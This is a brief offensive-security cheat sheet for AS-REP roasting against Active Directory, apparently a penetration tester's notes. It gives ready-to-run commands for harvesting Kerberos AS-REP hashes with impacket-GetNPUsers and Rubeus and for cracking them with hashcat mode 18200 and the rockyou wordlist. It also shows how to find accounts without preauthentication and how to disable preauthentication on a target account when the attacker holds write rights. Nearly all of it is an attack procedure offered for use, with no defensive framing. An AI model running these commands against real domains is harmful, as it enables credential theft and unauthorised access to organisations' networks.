# AS-REP ROASTING
#impacket-GetNPUsers 
```
# AS-REP ROASTING

impacket-GetNPUsers -dc-ip [ip] -request -outputfile [hashes file] [domain]/[username]
```

#crack 
```
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 18200 [hashes file] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#rubeus
```
.\Rubeus.exe asreproast /nowrap
```

#powerview 
```
Get-DomainUser with -PreauthNotRequired
```

#Targeted_AS-REP_Roasting
```
with GenericWrite or GenericAll modify the User Account Control value of the user to not require Kerberos preauthentication
```